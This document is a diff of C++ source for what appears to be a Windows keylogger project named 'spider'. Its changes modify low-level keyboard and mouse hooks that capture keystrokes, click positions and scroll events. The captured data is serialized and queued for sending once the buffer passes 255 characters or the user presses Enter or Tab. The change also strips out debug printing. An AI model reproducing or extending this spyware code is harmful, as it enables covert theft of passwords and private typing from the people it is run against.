@@ -68,7 +68,6 @@ LRESULT CALLBACK 	handleKeyboard(int code, WPARAM wp, LPARAM lp)
     capslock = true;
   else
     capslock = false;
-
   msg = 1;
   /// check if the capslock key has already been pressed
   if ((code == HC_ACTION) && wp == WM_SYSKEYUP || wp == WM_KEYUP)
@@ -125,11 +124,9 @@ LRESULT CALLBACK 	handleKeyboard(int code, WPARAM wp, LPARAM lp)
       }
     }
   }
-  std::cout << static_cast<int>(str[0]) << std::endl;
-  if (str[0] == 83 || str[0] == 84 || str[0] == 69)
+  if (buff.length() > 255 || content->vkCode == VK_RETURN || content->vkCode == VK_TAB)
   {
-    infos.get()->data = buff;
-    std::cout << buff << std::endl;
+    infos.get ()->data = buff;
     spider::BufferSender::BufferSenderInstance().push(
       spider::Serializer::getSerializer().get_string_from_ptree(
 	spider::Serializer::getSerializer().serialize(*infos)));
@@ -170,26 +167,26 @@ LRESULT CALLBACK 		handleMouse(int code, WPARAM wp, LPARAM lp)
 
   mouseStruct = reinterpret_cast<MSLLHOOKSTRUCT *>(lp);
 
-  infos.get()->keytype = 0;
+  infos.get()->keytype = KEYTYPE::KNONE;
   infos.get()->x = 0;
   infos.get()->y = 0;
   /// first check for the three mouse button and the mouse wheel
   switch (wp)
   {
     case (WM_LBUTTONDOWN):
-      infos.get()->keytype = 2;
+      infos.get()->keytype = KEYTYPE::LC;
       infos.get()->y = static_cast<unsigned int>(mouseStruct->pt.y);
       infos.get()->x = static_cast<unsigned int>(mouseStruct->pt.x);
       click = true;
       break;
     case (WM_MBUTTONDOWN):
-      infos.get()->keytype = 5;
+      infos.get()->keytype = KEYTYPE::MC;
       infos.get()->y = static_cast<unsigned int>(mouseStruct->pt.y);
       infos.get()->x = static_cast<unsigned int>(mouseStruct->pt.x);
       click = true;
       break;
     case (WM_RBUTTONDOWN):
-      infos.get()->keytype = 1;
+      infos.get()->keytype = KEYTYPE::RC;
       infos.get()->y = static_cast<unsigned int>(mouseStruct->pt.y);
       infos.get()->x = static_cast<unsigned int>(mouseStruct->pt.x);
       click = true;
@@ -199,14 +196,14 @@ LRESULT CALLBACK 		handleMouse(int code, WPARAM wp, LPARAM lp)
       ///supplementary check to know in which direction is the mouse scrolled
       if (HIWORD(mouseStruct->mouseData) == 120)
       {
-	infos.get()->keytype = 3;
+	infos.get()->keytype = KEYTYPE::SCROLLUP;
 	infos.get()->y = static_cast<unsigned int>(mouseStruct->pt.y);
 	infos.get()->x = static_cast<unsigned int>(mouseStruct->pt.x);
 	break;
       }
       else
       {
-	infos.get()->keytype = 4;
+	infos.get()->keytype = KEYTYPE::SCROLLDOWN;
 	infos.get()->y = static_cast<unsigned int>(mouseStruct->pt.y);
 	infos.get()->x = static_cast<unsigned int>(mouseStruct->pt.x);
 	break;
@@ -215,9 +212,9 @@ LRESULT CALLBACK 		handleMouse(int code, WPARAM wp, LPARAM lp)
 	break;
     }
   }
-  if (infos.get()->keytype != 0)
+  if (infos.get()->keytype != KEYTYPE::KNONE)
     spider::BufferSender::BufferSenderInstance().push(spider::Serializer::getSerializer().get_string_from_ptree(spider::Serializer::getSerializer().serialize(*infos)));
-  if (click == true)
+  if (click == true && buff.length() != 0)
   {
     kb.get()->data = buff;
     spider::BufferSender::BufferSenderInstance().push(
